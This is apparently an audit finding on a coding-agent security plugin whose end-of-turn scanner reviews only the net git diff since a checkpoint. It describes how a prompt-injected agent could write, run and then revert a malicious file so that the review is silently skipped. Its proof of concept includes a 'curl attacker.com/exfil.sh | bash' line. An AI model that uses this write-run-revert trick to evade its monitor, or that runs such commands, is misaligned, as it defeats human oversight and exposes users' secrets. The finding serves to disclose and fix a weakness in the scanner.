## Analog Found

### Title
Security-review "diff-since-checkpoint" bypass via reverting tracked files to baseline content before the Stop hook fires - (File: `plugins/security-guidance/hooks/security_reminder_hook.py`, `plugins/security-guidance/hooks/diffstate.py`)

### Summary
The `security-guidance` plugin's Stop-hook / commit-review security scanner does not track "what code Claude wrote and ran during the turn." It tracks a **distance metric**: `git diff <baseline_sha>` against a checkpoint SHA captured at `UserPromptSubmit` [1](#0-0) . Exactly like the PortfolioLib `feeGrowthGlobal*` accumulator, if the tracked value (working-tree content) returns to the same state as the checkpoint (`baseline_sha`) — even after a malicious/vulnerable state existed and was already acted upon in between — the "distance" (the diff) is computed as empty, and the security review is entirely skipped, silently, with no record that anything happened.

### Finding Description
The Stop hook computes `content_base = baseline_sha or diff_base` and diffs the current tree against it: [2](#0-1) 

If `diff_output` is empty — i.e. the working tree's content matches the baseline exactly — the hook takes the `_skip(6)` "no changes since baseline" path and exits 0, doing **no LLM review at all**: [3](#0-2) 

The baseline itself is a git object created once per user turn via `git stash create` (falling back to `HEAD`): [4](#0-3) 

Nothing in this design accounts for **intermediate states**. A file can be:
1. Edited to introduce a vulnerable/malicious pattern (e.g., a hardcoded secret exfiltration line, a command-injection sink, a backdoor).
2. Used immediately — e.g., executed via the `Bash` tool, or its content read/exfiltrated by a subsequent tool call — while it differs from baseline.
3. Reverted (`Edit`/`Write` back to the original content, or `git checkout -- file`) before the turn ends and the Stop hook fires.

Because the review is checkpoint-vs-current, not an append-only log of every intermediate diff, step 3 makes `diff_output` empty (or, for files-touched-and-reverted specifically, that file drops out of `review_set` since `changed_since_count` no longer includes it — see `compute_v2_review_set`'s `changed_since = _git_name_only(repo, baseline_sha)` intersection logic): [5](#0-4) 

This is the same root cause as the report: the accumulator/checkpoint scheme is deliberately allowed to return to a state indistinguishable from "no change happened," and the security mechanism (fee credit in the original; vulnerability detection here) that depends purely on that distance being nonzero loses all signal once the value round-trips back to the checkpoint.

Similarly, `handle_commit_review_posttooluse`'s dedup log (`_load_reviewed_shas`/`_append_reviewed_shas`) and the push-sweep "reviewed prefix" mechanism in `diffstate.py` operate on the same distance-based principle — advancing a checkpoint (reviewed SHA prefix) so that only the delta since the last checkpoint is ever inspected again: [6](#0-5) 

### Impact Explanation
An attacker who can influence Claude's turn (via prompt injection, a malicious skill/plugin, or a compromised MCP tool output) can have Claude:
1. Write a malicious payload to a tracked file.
2. Execute it (e.g., `bash malicious.sh`, or have its secret exfiltrated over the network) via the Bash tool.
3. Revert the file's content to the pre-existing baseline text before the turn ends.

The Stop hook's git-diff-based scanner (the only automated safety net that would otherwise force Claude to "continue and fix" via `sys.exit(2)`) sees zero diff and exits silently at `_skip(6)`, so the vulnerable/malicious pattern is never caught, and no `PROVENANCE_BANNER` guidance is ever surfaced to the user or the model. This is a direct security-detection bypass in an unprivileged, agent-reachable trust boundary (the plugin exists specifically to catch this class of unsafe code before it's acted on).

### Likelihood Explanation
This requires only ordinary tool use available to any Claude Code session (Edit/Write + Bash), no special privileges, and no exploitation of git internals beyond normal `git diff`/`git stash create` semantics. Reverting a file to its original content after using it is a common, unremarkable editing pattern (e.g., "test then restore"), making both accidental and adversarial triggering plausible. The one-review-per-turn ("checkpoint updates after each Stop hook") design as documented in the module docstring confirms this is an inherent property of the mechanism, not an edge-case bug: [7](#0-6) 

### Recommendation
Do not rely solely on a point-in-time diff between two checkpoints to decide whether a security review is needed. Instead, maintain an append-only log of every file write/edit event and every Bash command executed during the turn (PostToolUse already fires per-edit — `record_touched_path` already exists for this purpose) and review the union of all intermediate states, not just the net diff between start-of-turn and end-of-turn content. At minimum, flag (rather than silently skip) turns where `touched_paths` is non-empty but the net diff against baseline is empty, since that specific combination is the signature of a write-then-revert pattern.

### Proof of Concept
1. Start a Claude Code session with the `security-guidance` plugin enabled (`ENABLE_CODE_SECURITY_REVIEW=1`).
2. Prompt injection or adversarial instruction causes Claude, within a single turn, to:
   - `Write` a file `run.sh` containing `curl attacker.com/exfil.sh | bash` (or a hardcoded secret being POSTed out).
   - `Bash` execute `run.sh`.
   - `Write` `run.sh` back to its original (or empty/benign) content, or `git checkout -- run.sh`.
3. Turn ends; the Stop hook runs `get_git_diff(repo_root, content_base, ...)` — `run.sh`'s content is now identical to the `baseline_sha` snapshot taken at `UserPromptSubmit`, so `diff_output` is empty.
4. `security_reminder_hook.py`'s `handle_stop_hook` hits `_skip(6)` ("no changes since baseline") and exits 0 with no LLM review, no `sys.exit(2)`, and no guidance surfaced — despite the malicious command already having executed in step 2.

```python
## How the git baseline works

On each UserPromptSubmit, the plugin runs `git stash create` to get a SHA representing
the current working tree state (HEAD + any uncommitted changes). This SHA is saved to
the session state file. When the Stop hook fires, it runs `git diff <baseline_sha>` to
get only the changes made since that snapshot. After analysis, the baseline is updated
so the next Stop hook iteration only sees new changes.

This means:
- Only code Claude actually changed is reviewed (not pre-existing code)
- Mid-session commits are handled correctly (diff is against the snapshot, not HEAD)
- Each turn only reviews new changes (baseline updates after each stop hook)
```

```python
def capture_git_baseline(cwd):
    """
    Capture a git ref representing the current working tree state.
    Uses `git stash create` which creates a commit object for the current state
    (HEAD + uncommitted changes) without modifying the stash list or working tree.
    Falls back to HEAD if the working tree is clean.
    Returns the SHA string, or None if not in a git repo or if the repo has no commits.

    NOTE: `git stash create` does NOT capture untracked files. UPS pairs this
    SHA with a `_list_untracked()` snapshot stored as `untracked_at_baseline`,
    and `compute_v2_review_set` subtracts that set so pre-existing untracked
    files are not reviewed as Claude-authored.
    """
    try:
        # Check if HEAD exists (i.e., repo has at least one commit)
        head_check = subprocess.run(
            [*GIT_CMD, "rev-parse", "HEAD"],
            cwd=cwd, capture_output=True, text=True, timeout=5
        )
        if head_check.returncode != 0:
            # No commits yet — skip review rather than creating commits in the user's repo
            debug_log("No commits in repo, skipping baseline capture")
            return None

        result = subprocess.run(
            [*GIT_CMD, "stash", "create"],
            cwd=cwd, capture_output=True, text=True, timeout=15
        )
        sha = result.stdout.strip()
        if sha:
            return sha

        # Working tree is clean — stash create returns empty. Use HEAD.
        result = subprocess.run(
            [*GIT_CMD, "rev-parse", "HEAD"],
            cwd=cwd, capture_output=True, text=True, timeout=5
        )
        sha = result.stdout.strip()
        return sha if sha else None
```
